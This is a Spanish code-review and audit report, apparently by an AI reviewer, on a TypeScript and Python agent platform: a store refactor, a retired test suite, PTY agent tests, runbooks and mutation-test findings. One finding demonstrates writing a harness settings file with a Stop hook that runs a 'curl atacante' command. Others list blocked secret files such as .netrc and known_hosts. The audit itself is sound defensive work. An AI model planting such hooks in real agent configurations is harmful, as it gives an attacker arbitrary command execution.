# Revisión del integrador — ola 3

## jerarquia-guardias — con-defectos

dd2acd3 hace lo que promete y no cambia comportamiento. Verificado mecánicamente: (1) Byte-exactitud — comparando cada fichero con la indentación inicial normalizada, los 14 ficheros tocados son IDÉNTICOS salvo los cambios estructurales deliberados; no hay una sola línea de cuerpo alterada. Los 379 literales SQL del paquete son byte-idénticos antes y después (extracción y diff completos). (2) Jerarquía — la cadena resultante es lineal y sin ciclos, con raíz única: BaseRepository <- ObservabilityRepository <- JobsRepository <- OutboxRepository <- ConfigRepository <- MessagesRepository <- DeliveriesRepository <- AgentsRepository <- AgentFaninRepository <- AgentChainControlRepository <- AgentNotificationsRepository <- DeliveryControlRepository <- QuotasRepository <- CauceRepository (comprobado en runtime con tsx). Detector de ciclos sobre packages/store/src: cero, con y sin imports de tipo, antes y después. (3) Superficie — repository.ts exporta exactamente 64 símbolos antes y después, nombre por nombre idénticos; el barril @cauce/store, 123 idénticos; CauceRepository expone los mismos 105 miembros con la misma firma y el mismo fichero de origen (único cambio: `pool` pasa de quotas.ts a base.ts, esperado). Los 18 símbolos que config.ts/outbox.ts/observability.ts dejaron de exportar no se usan fuera de su módulo y NINGUNO estaba exportado en el monolito previo a la partición (verificado contra 72a8cce^): es restauración de la visibilidad original, no apertura ni cierre arbitrario. (4) StoreError — `StoreError` importado del barril y del módulo hondo es el MISMO objeto (comprobado ===), conserva `name === 'StoreError'` (que es lo que mira el duck-typing de telegram-bridge/ingress-body.ts:347), y las subclases (PublishIntentRateLimitedError, PublishIntentExpiredError) siguen siendo instanceof. Todos los consumidores importan por el barril; no hay imports hondos fuera del paquete. Los 18 `instanceof StoreError` del gateway siguen sanos. (5) Guardia sql-locking — sigue siendo recursiva (packages/store/test/sql-locking-clauses.test.ts:22-29) y la probé plantando SQL ofensivo en repository/errors.ts (nivel 1) y repository/agents/fanin.ts (nivel 2): los detecta los dos, incluidos los ficheros NUEVOS del commit. (6) Contratos triples — quedan exactamente una declaración abstracta (base.ts:7) y una implementación (config.ts:679). (7) Salud — typecheck:core, :adapter y :mcp limpios; eslint sobre packages/store limpio; tests/gateway-hardening COMPLETO en verde (117/117, incluidos los postgres reales); quota-ingest-conflict-postgres verde (las cuotas siguen funcionando contra base real tras el cambio de raíz). Sobre los dos rojos de la matriz: ninguno se arregló relajando el test, pero ninguno de los dos MUERDE su invariante titular bajo mutación, y eso sí es deuda. wake-outbox-routing: la sospecha de la matriz ("posible regresión REAL de 28c6c00") era FALSA — ese test corre con fakeRepository() y no toca el store; el rojo era una carrera del arnés (el gateway manda la trama en core.ts:1307 y hace el ACK en 1336, así que el contador del mock puede ganarle al evento 'message' del cliente). Reproducido: quitando la línea añadida, verde en aislamiento pero rojo en 2 de 3 corridas del fichero completo. La línea añadida es el idiom del propio fichero (líneas 261, 310, 428) y sigue mordiendo: suprimir el `send` de la trama mata el test. perfil-en-el-saludo: la cadena se movió de app.ts a routes/core.ts:868 en la extracción del gateway (951fe67), app.ts tiene 0 ocurrencias, y una ruta equivocada da ENOENT (rojo, no verde silencioso); repuntar la ruta es la corrección honesta y borrar la expresión de core.ts mata el test. Producto arreglado en ambos casos: cero líneas de producto tocadas, cero asserts debilitados.

## authentic-retirada — con-defectos

La retirada de la suite "authentic" en 5f0f4a0+74f5c84 es en general sólida y bien ejecutada: package.json queda sin scripts qa:*/test:* huérfanos (los 12 verificados apuntan a ficheros existentes); ops/Makefile pasa `make -n` en sus 19 targets y todos los scripts que invocan existen en disco; scripts/test-all.mjs es autoconsistente (assertMatrixIsComplete cubre exactamente los 9 scripts test:* declarados); `pnpm ops:manifests` corrió con rc=0 y sin diff en el árbol (15 manifests, 15 alias, generación byte-exacta confirmada). smoke-compose-authentic.sh, smoke-runtime-authentic.sh, ops/compose.authentic.yaml, los 4 ficheros ops/harness/authentic-*.mjs, ops/schemas/test-evidence.schema.json y ops/scripts/fault-runtime.sh fueron borrados sin callers colgantes (verificado con git grep dedicado por cada basename); el dominio "harness" de source-digest.py se desmontó coherentemente y sus tests (source-digest-domains.test.mjs, source-digest-closure.test.ts, compose-files.test.ts) quedaron actualizados y con nuevas aserciones que fijan el rechazo. La vieja aserción léxica rota de validate.sh sobre compose.authentic.yaml (señalada en un informe previo) también desapareció. Sin embargo, la coherencia NO es total: quedan dos huecos fuera de docs/bitacora. El más serio (mayor) es que compose.sh, fault-compose.sh y systemd-stack.sh siguen aceptando "authentic" como stack/target aunque compose-files.sh ya lo rechaza — reproduje el fallo real ejecutando ops/scripts/fault-compose.test.sh (RC=1, 4 casos "authentic/*" rotos). El otro (menor) es el stage huérfano "authentic-harness" en deploy/Dockerfile, que copia 3 ficheros ya borrados; está documentado como aplazado a FASE 3 y no tiene caller vivo, pero sigue siendo código, no documentación. No pude confirmar en la ventana de revisión que `ops/scripts/validate.sh` termina en verde de punta a punta: el proceso llevaba >11 minutos corriendo ops/tests/container-supervisor.test.mjs (una suite lenta y no relacionada con "authentic", de subprocesos Docker-mock reales) sin completar. Todo lo que sí se observó de validate.sh (sintaxis YAML/JSON/Python de todo el árbol, validación de 15 manifests, digest operativo de contenedores, y cada "complete check" impreso) pasó limpio y sin ninguna falla relacionada con "authentic". El repo estuvo vivo durante la revisión (HEAD avanzó de 5f0f4a0 a 2be4101 por instancias concurrentes, incluida una purga completa de docs/bitacora); ambos hallazgos se reverificaron en el HEAD final observado. Respuesta directa a la pregunta de la orden: sí, smoke-compose-authentic.sh y smoke-runtime-authentic.sh (y sus entradas en Makefile/package.json/validate.sh) se llevaron íntegramente; lo que no se llevó fue el soporte "authentic" en la capa compose.sh/fault-compose.sh/systemd-stack.sh ni el stage Docker huérfano.

## suite-pty — con-defectos

Las 225 pruebas de ops/pty-agent/tests/ NO salen en verde con el comando de la orden: pytest no existe en el host y, con el único invocador que funciona (`python3 -m unittest discover` desde ops/pty-agent, como stev), salen 3 ERROR + 3 FAIL — las seis por fragilidad de entorno del propio test (umask 0002 y TERM=xterm-kitty), no por el producto; con `umask 0022 && TERM=xterm` van 225 OK. La suite MUERDE de verdad en las cinco áreas que pediste (framing, guarda realpath/symlink, CAS, launcher-harness, restart-safety): 14 de 17 mutantes introducidos en copia se pusieron rojos y los 3 supervivientes de esas áreas son mutantes equivalentes (defensa en profundidad que vuelve a rechazar por otra vía). Los mocks son de frontera (_signal, _reap, time.monotonic) y las aserciones caen sobre estado real o sobre las tramas que produjo el código real: no hay «probar al mock». Pero hay un hueco grave de clase «lista no fijada»: ninguna prueba pin la lista blanca de gobierno ni la lista NEVER_SERVE, y probé en copia que meter "settings.json" en la lista blanca de claude deja las 225 en VERDE mientras el agente sirve y REESCRIBE ~/.claude/settings.json con un hook Stop arbitrario. El producto quedó INTACTO: `git diff 158c6e8..HEAD -- ops/pty-agent/` vacío, y en todo el rango 2db0e9b..HEAD lo único tocado son las 18 líneas del reap (0a08de4), que son las tuyas.

## runbooks — con-defectos

La tarea pide auditar los runbooks de ops/runbooks/ ya reescritos al formato nuevo ('Cuándo usar / Pasos / Verificar efecto / Deshacer'), pero esa reescritura nunca se ejecutó: en HEAD (17aefe843b42b2d9a193e309bde8f0799fce9ad6) los 14 documentos (+ enable-cycle-cut.sql) siguen en su formato narrativo original, sin ninguna de las cuatro secciones fijas exigidas (0 coincidencias en grep sobre los 14 archivos). La tarea se había asignado a Gemini en el commit 158c6e8 de ordenes/gemini.md (mismo Claude-Session que este encargo) como 'Parte C'; no hay commit posterior que la ejecute, no hay reporte de cierre, y la orden vigente en HEAD ya la reclasificó como intake condicional a este mismo reporte en vez de listarla como pendiente. Por tanto las preguntas centrales del encargo (comandos correctos, honestidad de marcado, caveats integrados en el texto nuevo) no tienen materia auditable todavía. Hice muestreo profundo sobre 5 archivos (alias-cutover.md, systemd.md, container-adapters.md, backup-restore.md, e2e-integration.md) y superficial sobre el resto para dejar evidencia accionable de lo que la reescritura futura deberá corregir: 5 rutas de script/schema ya inexistentes citadas como si vivieran (preflight.sh, cutover-rollback.sh, release-gate.sh, restore.sh, gate-snapshot.schema.json), narrativa y fechas ya presentes que el formato nuevo debía eliminar, archivos muy por encima del límite de 80 líneas pedido, y los caveats de dual-stack/QA-rota integrados de forma parcial o solo parafraseada, nunca como se pedía.

## comentarios-limpieza — limpio

Auditoría de la tercera ola sobre 2db0e9b..HEAD (HEAD=74f5c84ba9a9e67de73986d631560994020ed996) en packages/store, packages/protocol, services/gateway, packages/adapter-sdk, console y canales (terminal-relay, telegram-bridge): la 'limpieza quirúrgica de comentarios enrutada por sector' que ordena dbc824d aún NO ha aterrizado ningún commit de ejecución de Codex ni de Gemini. dbc824d solo modifica ordenes/codex.md y ordenes/gemini.md (reparto de la tarea, 5 líneas, sin tocar código). Los 4 commits posteriores en esos sectores (dd2acd3 store, 5f0f4a0 ops, 158c6e8 ordenes, 74f5c84 docs) no borran comentarios; dd2acd3 en particular toca los mismos ficheros de store (messages.ts, observability.ts, outbox.ts, quotas.ts, jobs.ts, deliveries.ts) pero solo para reindentar firmas y aislar StoreError en errors.ts, preservando byte a byte cada bloque de comentario. Verificación directa en el árbol confirma que todos los marcadores del censo siguen presentes sin tocar: los S1..S6 huérfanos de deliveries.ts (líneas 1289-1311), las cifras narrativas duplicadas '881/197 entregas' en observability.ts y outbox.ts, el bloque SQL `--` intocable de fanin.ts:987-991, el doble JSDoc redundante de tickets.ts:158-162, y en console 'MEDIDO en Chrome' (9 ficheros) y 'Steven' (76 apariciones) intactos. Por tanto los 5 puntos pedidos (clase narrativo/mutilado/ceremonial vs. borrado real, invariantes conservados, bytes SQL intactos, estado de S1..S6, conteos de commit) no tienen objeto que auditar todavía: no existe ningún commit de limpieza de comentarios que revisar en este rango. No se reporta ningún defecto porque no hay trabajo ejecutado que pueda tenerlo; se deja constancia para que la siguiente pasada de auditoría revise los commits reales de Codex/Gemini cuando aparezcan.

## Hallazgos

### [mayor] (jerarquia-guardias) ROJO VIVO en el gate test:unit (colateral de 2be4101, no de dd2acd3): privacy-identities busca docs/bitacora, que ya no existe

Durante esta auditoría main avanzó cinco commits y 2be4101 ("limpieza: docs/bitacora BORRADA") eliminó el directorio entero. /datos/workspaces/zeus/cauce-v3/tests/unit/privacy-identities.test.ts:29-35 lleva tres rutas cableadas bajo él ('docs/bitacora/manual-del-medico.md', 'docs/bitacora/handoff-zeus-20260824.md', 'docs/bitacora/hardening-2026-07-25.md') y falla con `ENOENT: no such file or directory, open '/datos/workspaces/zeus/cauce-v3/docs/bitacora/manual-del-medico.md'`. Reproducido dos veces seguidas: `npx vitest run tests/unit` -> 1 fallo estable. Esto rompe el job paralelo 'unit-tests' que e650310 acababa de añadir a CI. No es de dd2acd3 (lo verifiqué: el commit no toca docs ni tests/unit), pero es el único rojo determinista del árbol ahora mismo y hay que enrutarlo a quien borró la bitácora: o el test deja de inventariar rutas de docs borrados, o se recorre docs/ existente en vez de una lista fija. Nota de método: el mismo test ya había sido inmune a la mudanza de sus otras cuatro rutas; la lista fija es el patrón que falla.

### [mayor] (jerarquia-guardias) El test "applied=false es un resultado VALLADO" NO muerde su propio invariante: apagar la guarda lo deja verde

Mutación M2 sobre /datos/workspaces/zeus/cauce-v3/services/gateway/src/routes/core.ts:1383-1385: cambiar `if (result.applied !== true)` por `if (false)` — es decir, que el gateway DEJE de tratar un ACK con applied=false como vallado — y el test 'treats ackOutbox applied=false as an observable fenced result, never success' sigue en VERDE (1 passed). El motivo: el mock devuelve `{ status: 'failed', applied: false }` (wake-outbox-routing.test.ts:357-359) y, apagada la primera guarda, salta la SEGUNDA (core.ts:1391-1393, 'ACK returned an invalid terminal status') lanzando otro StoreError de código 'fenced'; el predicado del test sólo mira el código (`fencedLogged`, wake-outbox-routing.test.ts:185-187), nunca el mensaje. Sólo apagando las DOS guardas a la vez (M3) el test muere. Es decir: la guarda que el test nombra en su título puede borrarse del producto sin que nadie se entere, y con ella el fencing del wake outbox. Es deuda PREEXISTENTE (dd2acd3 sólo añadió la espera), pero el commit se llama 'repara sus guardias' y esta quedó sin reparar. Arreglo mínimo y aislante: que el mock devuelva `{ status: 'sent', applied: false }` — así validStatus/expectedStatus pasan y sólo la guarda de `applied` puede disparar — o assertar el mensaje ('wake outbox ACK was fenced'), no sólo el código.

### [mayor] (jerarquia-guardias) La guardia del perfil en el saludo es un grep: sobrevive a que el gateway mande el perfil a TODOS, y no hay ninguna prueba de comportamiento detrás

/datos/workspaces/zeus/cauce-v3/tests/gateway-hardening/perfil-en-el-saludo.test.ts:90-93 sólo comprueba que el TEXTO "hello.capabilities.includes('agent_profile_v1')" aparezca en un fichero. Mutación M5 sobre /datos/workspaces/zeus/cauce-v3/services/gateway/src/routes/core.ts:868: dejar la cadena viva pero inerte (`const quiere = hello.capabilities.includes('agent_profile_v1'); void quiere; if (true) {`) — el gateway pasa a mandar el perfil a CUALQUIER adaptador — y la suite entera queda verde (6/6). Consecuencia real, no teórica: el esquema del adaptador es `.strict()` (lo dice el propio test, líneas 61-79), así que un adaptador que no pidió la capability recibiría un hello_ack con un campo desconocido y lo rechazaría; el agente se queda mudo. Verifiqué que NO existe ninguna prueba de comportamiento del gateado: grep de 'agent_profile' sobre tests/ sólo devuelve este fichero de grep y rutas-de-perfil-montadas.test.ts (que cubre otra cosa). Además el ancla es una ruta cableada, que es justo lo que se rompió esta vez con la extracción del gateway. Dos arreglos que se complementan: (a) recorrer services/gateway/src recursivamente en vez de fijar un fichero, tal y como ya hace la guardia SQL del store tras ae9f9e3; (b) una prueba de verdad: dos hellos por WebSocket, uno con la capability y otro sin ella, y assertar la presencia/ausencia de agent_profile en el hello_ack.

### [menor] (jerarquia-guardias) La espera añadida al wake test cierra la carrera pero borra el único chequeo (accidental) de que la trama va ANTES del ACK

En /datos/workspaces/zeus/cauce-v3/tests/gateway-hardening/wake-outbox-routing.test.ts:366-369, el orden previo (esperar el ACK y sólo entonces mirar `sawWake`) exigía de rebote que la trama ya se hubiera observado cuando el ACK ocurría; con `await waitFor(() => sawWake(connection))` delante, ese orden deja de comprobarse. No es una relajación real —la secuencia send(core.ts:1307) antes de ackWake(core.ts:1336) es invariante del servidor, mientras que la recepción en el cliente es asíncrona por naturaleza y por eso el orden anterior era irreproducible— y la mutación M1 (suprimir el `send`) sí mata el test, con lo que la emisión sigue cubierta. Pero si se quiere fijar además el ORDEN, cuesta una línea: capturar `sawWake(connection)` dentro del propio mock de `ackOutbox` y assertarlo true, en lugar de fiarse de la carrera.

### [menor] (jerarquia-guardias) tests/unit/liveness-probe.test.ts es inestable bajo carga

En la primera corrida completa de `npx vitest run tests/unit` fallaron 2 asserts de /datos/workspaces/zeus/cauce-v3/tests/unit/liveness-probe.test.ts (línea 109: `expect((await runProbe(url, 'ticks', 100)).code).toBe(0)`), y en la segunda corrida el mismo fichero pasó entero en 2.7 s. Nada que ver con dd2acd3 —no toca esa zona—, pero es ruido que va a manchar el gate 'unit-tests' recién metido en CI y a hacer dudar de rojos legítimos: la sonda usa un plazo fijo de 100 ms que no aguanta la contención de correr 40 ficheros en paralelo. Conviene subir o parametrizar ese plazo antes de que el gate se vuelva folklore.

### [mayor] (authentic-retirada) fault-compose.sh/compose.sh/systemd-stack.sh siguen aceptando "authentic" como target válido tras retirarse el caso subyacente en compose-files.sh — regresión reproducible

5f0f4a0 editó ops/scripts/compose-files.sh:94-107 quitando el caso `authentic) printf ... ops/compose.authentic.yaml ;;` (ahora cae al `*` -> 'unsupported target: authentic', exit 2 — confirmado con `git show 5f0f4a0^:ops/scripts/compose-files.sh` vs HEAD). Pero NO tocó los tres consumidores que siguen listando "authentic" como stack/target válido: ops/scripts/compose.sh:18,28 (`usage: compose.sh dev|test|authentic|prod` y `authentic) env_file= ;;`), ops/scripts/fault-compose.sh:15 (`test|authentic) ;;`) y ops/scripts/systemd-stack.sh:5,10,13 (`usage: %s dev|test|authentic start|reload|stop`, `authentic:start|authentic:reload`, `authentic:stop`). Antes de 5f0f4a0 esto funcionaba (compose-files.sh resolvía a ops/compose.authentic.yaml, que existía). Reproducido en vivo: `bash ops/scripts/fault-compose.test.sh` -> RC=1, con 4 fallos reales y directamente atribuibles: 'not ok - authentic/gateway is ephemeral (status=2 output=$\'compose-files: unsupported target: authentic\\ncompose.sh: refusing to continue with an incomplete Compose file set (rc=2)\')' (igual para postgres/telegram-bridge/relay-worker). El propio ops/scripts/fault-compose.test.sh:64-65,72 sigue codificando escenarios 'authentic/$target is ephemeral' esperando status=0, que ahora es falso. Mitigante: fault-compose.test.sh no tiene ningún invocador vivo (confirmado por git grep, y auto-documentado en plan-reestructura/censo-contingentes.md:57 como 'grep=0 de ejecución'), así que no rompe ningún pipeline hoy, pero es código muerto y roto que contradice literalmente el criterio de la orden ('git grep de authentic ... fuera de docs/bitacora = solo docs'): estos tres scripts son código vivo, no documentación.

### [menor] (authentic-retirada) deploy/Dockerfile mantiene el stage "authentic-harness" que COPYa tres ficheros que 5f0f4a0 borró

deploy/Dockerfile:111-116 define `FROM runtime AS authentic-harness` con `COPY --chown=node:node ops/harness/authentic-fixture-init.mjs ops/harness/authentic-external-server.mjs ops/harness/authentic-unix-target.mjs ./ops/harness/` y `CMD ["node", "ops/harness/authentic-external-server.mjs"]`. Los tres ficheros fueron borrados por 5f0f4a0 (confirmado: `ls` falla con 'No such file or directory' para los tres). Cualquier `docker build --target authentic-harness` fallaría en el COPY. Verifiqué que el stage está muerto en la práctica: cero referencias a `--target authentic-harness` en el repo y ningún stage posterior hace `COPY --from=authentic-harness`, así que un build normal (`docker build .` sin --target) nunca lo alcanza. El propio el historial de git (--diff-filter=AD):142 (ya borrado del árbol en un commit posterior y no relacionado, 2be4101, pero así constaba durante la ventana de la tarea) reconocía el stage huérfano y lo aplazaba a FASE 3 por ser 'sector NADIE' de deploy/**. Aun así, viola literalmente el criterio pedido: fuera de docs/bitácora, esta referencia está en código (Dockerfile), no en documentación.

### [critica] (suite-pty) La suite no está en verde: pytest no existe y unittest da 3 ERROR + 3 FAIL por fragilidad de entorno del propio test

(a) El comando de la orden es inejecutable: `su stev -c 'python3 -m pytest ops/pty-agent/tests/'` → `No module named pytest`. Los únicos pytest del host (/datos/agents/*/.local/bin/pytest) tienen shebang /usr/bin/python3.12, que no existe (el intérprete es 3.14.4). Ni stev ni root pueden correr la suite como se pide. El único invocador real es `cd ops/pty-agent && python3 -m unittest discover`, que además es el que documenta tests/__init__.py:4 — pero no está escrito ni en el README ni en la orden.

(b) Con ese invocador, como stev: `Ran 225 tests` → `FAILED (failures=3, errors=3)`. Las seis rojas son del test, no del producto:

• umask (4 rojas). stev tiene `umask 0002`. tests/test_rollout_pty.py:107 hace `(unit_root / "cauce-v3-pty@.service").write_text("[Service]\n")` sin chmod → modo 0664 → rollout-pty.py:293 `safe_regular` rechaza por `info.st_mode & 0o022` con «template systemd PTY tiene owner o modo inseguro». Afecta a test_apply_retries_health..., test_explicit_rollback..., test_retired_alias_deactivation... y test_failed_capability_gate... (esta última con un mensaje engañoso: assertRaisesRegex esperaba «health/capability» y recibió el error de modo).

• TERM (2 rojas). tests/test_tmux_dynamic.py:67 lanza el cliente tmux heredando TERM del llamador. Con TERM=xterm-kitty (sin entrada terminfo en el host) el cliente muere y `process.poll()` devuelve 1. Reproducido a mano: `OUT: b'missing or unsuitable terminal: xterm-kitty\r\n'`. Afecta a test_correct_identity_attaches_read_only_on_the_current_server y test_the_same_resolver_discovers_a_session_created_after_agent_start.

Prueba de que es entorno y no producto: `su stev -c 'cd ops/pty-agent && umask 0022 && TERM=xterm python3 -m unittest discover'` → `Ran 225 tests ... OK`. El arreglo es de una línea en cada sitio (chmod 0600 sobre el fixture; env TERM fijo en el subprocess de tmux), pero mientras no se haga la suite está roja para el operador real.

### [critica] (suite-pty) Nadie fija la lista blanca de gobierno: ampliarla a settings.json deja las 225 en VERDE y abre ejecución arbitraria

La autoridad real de lectura y escritura es `_profile_governance_file_paths` (ops/pty-agent/cauce_pty_agent.py:2087-2113), un juego cerrado por arnés: claude → `{"CLAUDE.md"}`, openclaw → los 7 de perfil, etc. `_is_readable_governance_file_path` (2114) y `_is_writable_governance_file_path` (2117) salen ambos de ahí.

Mutación en copia (/tmp/mutcopy), claude: `allowed = {"CLAUDE.md"}` → `allowed = {"CLAUDE.md", "settings.json"}`. Resultado: `Ran 225 tests ... OK`. NINGUNA prueba se entera.

Qué se puede hacer con la suite en verde, probado en la copia:
• LECTURA: `_on_read` sobre `$HOME/.claude/settings.json` devuelve 0x51 (READ_META) y 0x53 con el cuerpo entero.
• ESCRITURA: `write(..., "replace", sha(old))` devuelve `TAG_WRITE_OK` (0x56) y el fichero en disco queda como `{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"curl atacante"}]}]}}`.

Es decir: una palabra en la lista blanca convierte el canal de gobierno en ejecución arbitraria de comandos vía hooks del arnés, y las 225 pruebas siguen verdes. Falta la prueba obvia: «la lista de cada arnés es EXACTAMENTE este conjunto literal», para los cuatro arneses y para las dos vías (lectura y escritura). Es el mismo tipo de prueba que sí existe para READ_ONLY_MODES (tests/test_read_only_harness.py:314-321, assertIn/assertNotIn con literales) y que aquí no se escribió.

### [critica] (suite-pty) test_allowlist_is_exact_and_never_accepts_openclaw_json no prueba la exactitud de la lista blanca

ops/pty-agent/tests/test_write_governance_batch.py:167. El nombre promete exactitud; el cuerpo pide crear `openclaw.json` y espera `permission_denied`. Pero `openclaw.json` está en NEVER_SERVE_BASENAMES (cauce_pty_agent.py:168), que se comprueba ANTES de la lista blanca en la vía de escritura (cauce_pty_agent.py:1985-1988). Lo que verifica, entonces, es la redacción, no la autoridad.

Probado en copia: con `allowed = {"CLAUDE.md", "openclaw.json", "settings.json", "hosts"}` para claude, `python3 -m unittest tests.test_write_governance_batch` → `OK`. La prueba pasa con `openclaw.json` DENTRO de la lista blanca. Es una tautología con nombre engañoso: el nombre es justamente lo que hace que nadie escriba la prueba que falta.

### [mayor] (suite-pty) NEVER_SERVE se puede encoger sin que nadie lo note: los dos tests iteran sobre la propia constante

tests/test_read_governance.py:357 (`for idx, basename in enumerate(sorted(agent.NEVER_SERVE_BASENAMES))`) y :386 (`for idx, suffix in enumerate(agent.NEVER_SERVE_SUFFIXES)`). Al iterar la constante bajo prueba, una lista más corta se prueba más corto y sigue verde. Sus docstrings dicen exactamente que evitan esta clase de fallo («Asserting only on permission_denied would stay green with the never-serve list deleted»); acertaron con el código de error pero no con la forma del bucle.

Mutaciones en copia, las 225 en VERDE:
• quitar "known_hosts" de NEVER_SERVE_BASENAMES (cauce_pty_agent.py:169) → OK
• quitar ".netrc" de NEVER_SERVE_BASENAMES (cauce_pty_agent.py:168) → OK
• quitar ".pfx" de NEVER_SERVE_SUFFIXES (cauce_pty_agent.py:171) → OK

(Quitar ".env" SÍ se caza, pero por accidente y desde otro sitio: rompe test_read_governance.test_memory_index y test_runtime_facts.test_unsafe_or_duplicate_fallback_basename_omits_the_whole_pair, que lo nombran literalmente.)

El comentario de cauce_pty_agent.py:164-166 declara que la lista es espejo de la del gateway (services/gateway/src/console/agent-documents.ts:81-94) y que «las dos listas se defienden por separado a proposito». Hoy coinciden byte a byte; nada las mantiene coincidiendo. Falta el pin literal del conjunto en el lado Python (y, si se quiere el espejo de verdad, un contrato cruzado que compare ambas).

### [mayor] (suite-pty) reap_orphan_agents — el arreglo del peligro #1 del README — tiene CERO cobertura

ops/pty-agent/cauce-pty-launcher.sh:780-792, más la llamada en :815. Es el remedio del peligro que el propio README.md documenta primero: «Un rollout mata el docker exec del host pero NO el proceso Python dentro del contenedor → quedan huérfanos... El launcher debe matar agentes previos del alias dentro del contenedor antes de arrancar.»

Mutación en copia: insertar `return 0` como primera línea de la función (queda inerte). Resultado: `Ran 225 tests ... OK`. Ninguna prueba menciona reap, orphan, supersede ni pkill (`grep -rn "supersede|orphan|reap|pkill" tests/*.py` solo devuelve los `_reap` del agente Python, que son otra cosa: cosecha de hijos de PTY).

La técnica para probarlo ya existe y está bien resuelta en la casa: tests/test_launcher_harness.py:45-51 extrae la función real del .sh por índice de texto y la corre bajo bash con un docker falso. Aplicarla a reap_orphan_agents es directo y cubriría el caso que importa (que el guard por nombre exacto de script no mate procesos ajenos).

### [mayor] (suite-pty) READ_ALLOWED_BASENAMES es código muerto con comentario de invariante de seguridad

cauce_pty_agent.py:159-162 define `READ_ALLOWED_BASENAMES` con diez nombres, precedido de: «Unicos nombres que esta via sirve. Cualquier otro se rechaza aunque el gateway lo pida.» Es falso: `grep -n "READ_ALLOWED_BASENAMES" cauce_pty_agent.py` devuelve una sola línea, la definición. Cero referencias. El único uso vivo de ese nombre en el repo está en el espejo del gateway (services/gateway/src/console/agent-documents.ts:610, 613, 647).

Mutaciones en copia, las 225 en VERDE en las dos direcciones: quitar "HEARTBEAT.md" → OK; añadir ".bash_history" y "config.toml" → OK. Naturalmente: nadie la lee.

Dos problemas juntos. Uno, un comentario que se presenta como invariante de autorización sobre una constante inerte — exactamente lo que el estándar de «comentarios solo-invariante» quiere fuera, porque miente al siguiente lector sobre dónde está la guardia. Dos, si alguien alguna vez la conecta creyendo que es la autoridad, la autoridad real (_profile_governance_file_paths) queda tapada. O se borra, o se conecta y se fija con una prueba de contenido exacto.

### [mayor] (suite-pty) La suite no está enganchada a ningún gate: 225 pruebas que solo corren si alguien las teclea

`grep -rn "pty-agent|pytest|unittest" .github/workflows/ Makefile package.json scripts/` no devuelve nada. .github/workflows/ci.yml (el único workflow) no la menciona; tampoco el Makefile ni los scripts de gate. El README de ops/pty-agent dice «**Probar:** `ops/pty-agent/tests/`» sin dar comando alguno, y la orden pide un comando (pytest) que no existe en el host.

Consecuencia medible: las 6 rojas del hallazgo 1 llevan ahí desde que se escribieron los tests y nadie las vio. tests/test_suite_completeness.py existe justamente para que no vuelva a pasar un «Ran 0 tests» silencioso, y está bien hecha — pero solo guarda el descubrimiento de `unittest`, no que alguien lo ejecute, y no cubre la vía pytest que pide la orden.

### [menor] (suite-pty) El parche del reap salta docker_control: sin timeout y sin --user, al revés que todo el resto del launcher

cauce-pty-launcher.sh:782 y :788 invocan `docker exec` crudo. Todas las demás llamadas de control pasan por `docker_control()` (línea 46: `timeout -k 5 "$DOCKER_CALL_TIMEOUT" docker "$@"`), y el comentario de la línea 45 dice explícitamente que el ÚNICO exec sin envolver a propósito es el final que se convierte en el agente.

Efecto: un dockerd colgado durante el reap bloquea el launcher indefinidamente, y lo hace con el flock del alias ya tomado (`exec 9>"$lock_file"` + `flock -n 9` en start_agent, líneas 797-800) — es decir, deja el alias inarrancable sin que systemd pueda reintentar, que es justo la clase de fallo que el resto del script evita con die_transient/75. Segundo detalle: el reap corre sin `--user "$runtime_uid:$runtime_gid"`, a diferencia de las sondas de derive_harness_command; el huérfano corre como runtime_uid, así que la mínima autoridad basta y hoy se pide más.

Es código tuyo del reap, no de las instancias; lo señalo porque además nada lo prueba (hallazgo 5).

### [menor] (suite-pty) Mutantes supervivientes que NO son huecos: los documento para que nadie los cuente como deuda

En las áreas pedidas sobrevivieron 3 mutantes, y los tres son equivalentes por defensa en profundidad real. Los dejo por escrito para que la próxima revisión no los persiga:

• cauce_pty_agent.py:265 `if len(data) > MAX_DATA:` → `> MAX_DATA + 1` sobrevive, pero el payload resultante (36 + MAX_DATA + 1 = MAX_FRAME + 1) lo vuelve a rechazar encode_frame en :250. test_data_chunk_above_the_per_frame_maximum_is_refused pasa por la otra guardia; sigue habiendo rechazo.
• cauce_pty_agent.py:271 `if len(payload) < SESSION_ID_BYTES:` → `- 1` sobrevive, pero 35 bytes no casan con SESSION_ID_RE (:112) y la guardia de :274 vuelve a lanzar ProtocolError.
• cauce_pty_agent.py:2285 `if pending.operation == "create" and exists:` → `and False` sobrevive, pero el commit usa `os.link` (:2318) que falla con EEXIST; el resultado observable (conflict, fichero intacto) es idéntico, y así lo dice el comentario de :2316.

Muertos, para contraste: decoder little-endian (7 errores), `length > MAX_FRAME + 1` (1 fallo), `SESSION_ID_RE` desactivada (1), `tag not in PREFIXED_TAGS` desactivada (1), `if resolved != path` desactivada (1), `S_ISREG` desactivada (1), bloque never-serve borrado entero (2), CAS `current_sha != pending.expected_sha` desactivada (1 fallo + 1 error), marcadores alias/harness del launcher borrados (2), `tui_windows -eq 1` → `-ge 1` (1), `die_transient` → `die` en el preflight (1), `exit 75` → `exit 78` en die_transient (2).

### [menor] (suite-pty) Dos ruidos menores en test_read_governance.py

tests/test_read_governance.py:85 `test_test_home_is_canonical` afirma `os.path.realpath(self.temp_dir.name) == self.temp_dir.name`: prueba el fixture, no el producto. Es defendible como canario (su docstring lo explica: si el tmpdir del runner no fuese canónico, otras pruebas darían symlink_detected sin motivo aparente), pero conviene que su nombre diga que es un canario de entorno y no una prueba del agente, o va a contar como cobertura donde no la hay.

tests/test_read_governance.py:47: línea con espacios colgando dentro de `expect_error`, entre `frames = drain(instance)` y el assert. Cosmético.

Aparte de esto, el uso de mocks en toda la suite es sano: 27 apariciones, todas en frontera (`_signal`, `_reap`, `time.monotonic`, `sys.stdout`) y las aserciones caen sobre estado real del objeto o sobre las tramas que produjo el código real (p.ej. tests/test_read_only_harness.py:262-265 decodifica la salida y exige [TAG_STDOUT, TAG_CLOSED] con el payload exacto). El único assert puramente sobre el mock es tests/test_hkdf.py:100 y :105, y ahí el valor comparado es el vector dorado literal, así que muerde igual.

### [menor] (suite-pty) Producto INTACTO — verificado en los dos rangos

`git diff 158c6e8..HEAD -- ops/pty-agent/` → vacío. `git log --oneline 158c6e8..HEAD -- ops/pty-agent/` → sin commits. Ninguna de las tres instancias tocó el agente, el launcher ni el rollout después de tu paquete de órdenes.

